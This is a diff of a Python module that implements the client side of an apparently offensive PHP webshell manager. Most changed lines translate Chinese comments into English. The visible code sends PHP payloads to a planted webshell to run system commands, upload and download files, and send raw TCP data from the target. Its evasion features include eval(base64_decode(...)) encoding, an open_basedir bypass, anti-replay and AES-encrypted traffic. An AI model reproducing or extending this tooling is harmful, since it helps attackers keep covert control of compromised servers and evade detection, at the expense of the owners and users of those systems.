@@ -1,4 +1,4 @@
-"""PHP Session的实现"""
+"""PHP Session implementation"""
 
 import re
 import asyncio
@@ -65,11 +65,11 @@ try{{{payload_raw}}}catch(Exception $e){{die("POSTEXEC_F"."AILED");}}
 echo '{delimiter_stop}';"""
 )
 
-# 这些php代码中的{xxx}不是python的format string语法而是format_phpcode函数
-# 识别的字符替换关键字，这是为了避免错误替换php代码中代码块的花括号
+# The {xxx} in PHP code are placeholders for format_phpcode, not Python format strings
+# This avoids accidentally replacing braces in PHP code blocks
 
-# TODO: 如果用户提供的命令打印了WRONG_NO_FUNCTION则这里的代码会将正常的输出
-# 当成是发生错误，需要修改输出的字符为随机字符
+# TODO: If a user command prints WRONG_NO_FUNCTION, this code will treat it as an error
+# Use randomized markers to avoid false positives
 
 EXECUTE_COMMAND_PHP = compress_phpcode_template(
     """
@@ -301,7 +301,7 @@ if(!is_file({filepath})) {
 """
 )
 
-# 为了防止阻塞其他使用同一个PHPSESSID的操作，关闭session写入
+# Close session writes to avoid blocking other operations sharing PHPSESSID
 SEND_BYTES_OVER_TCP_GOPHER_CURL_PHP = compress_phpcode_template(
     """
 function send_tcp($host, $port, $s)
@@ -651,14 +651,14 @@ basic_info_names = {
 
 
 def base64_encode(s: t.Union[str, bytes]):
-    """将给定的字符串或字节序列编码成base64"""
+    """Encode a string or bytes into base64"""
     if isinstance(s, str):
         s = s.encode("utf-8")
     return base64.b64encode(s).decode()
 
 
 def string_repr(s: str) -> str:
-    """给出字符串的PHP表达式，在字符串较为复杂时使用base64编码"""
+    """Return a PHP expression for a string, use base64 for complex strings"""
     r = repr(s)
     if "$" not in r and "\\" not in r:
         return r
@@ -666,7 +666,7 @@ def string_repr(s: str) -> str:
 
 
 def format_phpcode(code: str, **kwargs) -> str:
-    """使用kwargs中的值替换code中类似{xxx}的部分，并且忽略不存在的{xxx}"""
+    """Replace {xxx} in code with kwargs and ignore missing placeholders"""
     for key, value in kwargs.items():
         code = code.replace("{" + key + "}", value)
     return code
@@ -676,7 +676,7 @@ def to_sessionize_payload(
     payload: str, chunk: int = PAYLOAD_SESSIONIZE_CHUNK
 ) -> t.List[str]:
     payload = base64_encode(payload)
-    payload_store_name = f"_{uuid.uuid4()}"  # PHP有时不支持数字session key
+    payload_store_name = f"_{uuid.uuid4()}"  # PHP sometimes does not support numeric session keys
     payloads = []
     for i in range(0, len(payload), chunk):
         part = payload[i : i + chunk]
@@ -692,7 +692,7 @@ def to_sessionize_payload(
 
 
 async def get_aes_key(pubkey, submitter):
-    session_name = f"_{uuid.uuid4()}"  # PHP有时不支持数字session key
+    session_name = f"_{uuid.uuid4()}"  # PHP sometimes does not support numeric session keys
     key_encrypted = await submitter(
         format_phpcode(
             ENCRYPTION_SENDKEY_PHP,
@@ -701,22 +701,22 @@ async def get_aes_key(pubkey, submitter):
         )
     )
     if key_encrypted == "WRONG_NO_OPENSSL":
-        raise exceptions.TargetRuntimeError("目标不支持OpenSSL扩展！")
+        raise exceptions.TargetRuntimeError("Target does not support OpenSSL extension")
     if key_encrypted == "WRONG_NO_OPENSSL_FUNCTION":
-        raise exceptions.TargetRuntimeError("目标不支持openssl_public_encrypt函数！")
+        raise exceptions.TargetRuntimeError("Target does not support openssl_public_encrypt")
     try:
         key = private_decrypt_rsa(key_encrypted)
     except Exception as exc:
         raise exceptions.TargetRuntimeError(
-            "部署加密失败，无法从服务器获得对应的key"
+            "Encryption setup failed; cannot obtain key from server"
         ) from exc
     return session_name, key
 
 
-# PHPWebshellActions和PHPWebshellCommunication分别提供了
-# PHPSessionInterface的实现和连接webshell使用的加密等功能
-
-# 给前端显示的PHPWebshellOptions选项
+# PHPWebshellActions and PHPWebshellCommunication provide
+# PHPSessionInterface implementations and webshell encryption features
+#
+# PHPWebshellOptions shown to the frontend
 php_webshell_action_options = [
     Option(
         id="updownload_chunk_size",
@@ -794,23 +794,23 @@ php_webshell_communication_options = [
 ]
 
 
-# 注意：在继承的时候必须复用HTTP client（或者至少在cookie里指定session id），否则某些功能无法工作
+# Note: subclasses must reuse the HTTP client (or at least share the session id in cookies)
 class PHPWebshellActions(PHPSessionInterface):
-    """PHP session各类工具函数的实现"""
+    """PHP session helper implementations"""
 
     def __init__(self, conn: t.Union[None, dict]):
-        # conn是webshell从前端或者数据库接来的字典，可能是上一个版本，没有添加某项的connection info
-        # 所以其中的任何一项都可能不存在，需要使用get取默认值
+        # conn is a dict from frontend/DB, possibly from an older version
+        # any field may be missing; use get with defaults
         options = conn if conn is not None else {}
         # for upload file and download file
         self.chunk_size = int(options.get("updownload_chunk_size", 1024 * 16))
         self.max_coro = int(options.get("updownload_max_coroutine", 4))
 
-    # --- 以下是Interface的实现，依赖submit函数 ---
+    # --- Interface implementations below rely on submit() ---
 
     async def execute_cmd(self, cmd: str) -> str:
-        # 在执行长时间操作时会导致阻塞其他使用同一个PHPSESSID的操作
-        # 所以需要关闭session来避免阻塞
+        # Long operations can block other requests sharing PHPSESSID
+        # Close session to avoid blocking
         result = await self.submit(
             format_phpcode(EXECUTE_COMMAND_PHP, cmd=string_repr(cmd))
         )
@@ -952,11 +952,11 @@ class PHPWebshellActions(PHPSessionInterface):
             )
         )
         if result == "WRONG_NO_PERMISSION":
-            raise exceptions.FileError("没有权限写入文件夹")
+            raise exceptions.FileError("No permission to write folder")
         if result == "WRONG_FILE_EXISTS":
-            raise exceptions.FileError("文件已存在")
+            raise exceptions.FileError("File already exists")
         if result != "OK":
-            raise exceptions.FileError("检查文件写入权限失败")
+            raise exceptions.FileError("Failed to check file write permission")
 
         async def upload_chunk(chunk: bytes):
             nonlocal done_coro, done_bytes
@@ -1181,30 +1181,30 @@ class PHPWebshellActions(PHPSessionInterface):
         return await self.submit_http(code)
 
     async def submit(self, payload: str) -> str:
-        raise NotImplementedError("子类提供这个函数以驱动这些Actions函数")
+        raise NotImplementedError("Subclass must provide this function to drive actions")
 
     async def submit_http(self, payload: str) -> t.Tuple[int, str]:
-        raise NotImplementedError("子类提供这个函数以驱动这些Actions函数")
+        raise NotImplementedError("Subclass must provide this function to drive actions")
 
 
 class PHPWebshellCommunication(PHPWebshellActions):
     """
-    这里实现了
-    - 在HTML输出中精确找到对应的php代码输出
-    - encoder和decoder的调用
-    - 应用防重放、opendir绕过、session暂存payload、AES加密等功能
+    This class implements:
+    - Precise extraction of PHP output from HTML responses
+    - Encoder/decoder invocation
+    - Anti-replay, opendir bypass, session payload cache, AES encryption
 
-    这个类需要子类提供submit_http函数，在submit_http的功能之上提供submit函数
+    Subclasses must provide submit_http; submit is built on top of it
 
-    继承这个类时放在PHPWebshellActions之前
+    Inherit this class before PHPWebshellActions
     """
 
     def __init__(self, conn: t.Union[None, dict]):
-        # 这里的super()调用的是兄弟类PHPWebshelLAction等的__init__函数
-        # 所以需要传一个conn
+        # super() calls sibling class initializers like PHPWebshellAction
+        # so a conn is required
         super().__init__(conn)  # type: ignore
-        # conn是webshell从前端或者数据库接来的字典，可能是上一个版本，没有添加某项的connection info
-        # 所以其中的任何一项都可能不存在，需要使用get取默认值
+        # conn is a dict from frontend/DB, possibly from an older version
+        # any field may be missing; use get with defaults
         options = conn if conn is not None else {}
         self.encoder = options.get("encoder", "raw")
         self.decoder = options.get("decoder", "raw")
@@ -1213,17 +1213,17 @@ class PHPWebshellCommunication(PHPWebshellActions):
         self.encryption = options.get("encryption", False)
         self.bypass_open_basedir = options.get("bypass_open_basedir", False)
 
-        # AES key以及其在服务器session中存储的名字
-        # 在和服务器握手获取key的时候需要加锁
+        # AES key and its session storage name on server
+        # Lock during handshake when obtaining key
         self.fetchkey_lock = asyncio.Lock()
         self.aes_session_name = None
         self.aes_key = None
 
         if self.decoder not in decoders:
-            raise exceptions.ServerError(f"找不到Decoder: {self.decoder}")
+            raise exceptions.ServerError(f"Decoder not found: {self.decoder}")
 
     def encode(self, payload: str) -> t.Union[str, bytes]:
-        """应用编码器"""
+        """Apply encoder"""
         if self.encoder == "raw":
             return payload
         if self.encoder == "base64":
@@ -1231,7 +1231,7 @@ class PHPWebshellCommunication(PHPWebshellActions):
             return f'eval(base64_decode("{encoded}"));'
         if self.encoder.endswith(".py"):
             return custom_encoders.get_encoder(self.encoder)(payload)
-        raise exceptions.ServerError(f"找不到Encoder: {self.encoder}")
+        raise exceptions.ServerError(f"Encoder not found: {self.encoder}")
 
     def decode(self, output: str) -> str:
         if self.decoder in decoders:
@@ -1344,7 +1344,7 @@ class PHPWebshellCommunication(PHPWebshellActions):
         )
 
     async def submit_unwrapped(self, payload: str) -> str:
-        """将php payload通过encoder编码后提交"""
+        """Submit php payload after encoding"""
         start, stop = (
             "".join(random.choices(string.ascii_lowercase, k=6)),
             "".join(random.choices(string.ascii_lowercase, k=6)),
@@ -1393,12 +1393,12 @@ class PHPWebshellCommunication(PHPWebshellActions):
         return await submitter(payload)
 
     async def submit_http(self, payload: t.Union[str, bytes]) -> t.Tuple[int, str]:
-        """提交原始php payload
+        """Submit raw php payload
 
         Args:
-            payload (str): 需要提交的payload
+            payload (str): payload to submit
 
         Returns:
-            t.Union[t.Tuple[int, str], None]: 返回的结果，要么为状态码和响应正文，要么为None
+            t.Union[t.Tuple[int, str], None]: status code and body or None
         """
-        raise NotImplementedError("这个函数应该由实际的实现override")
+        raise NotImplementedError("This function should be overridden by implementation")
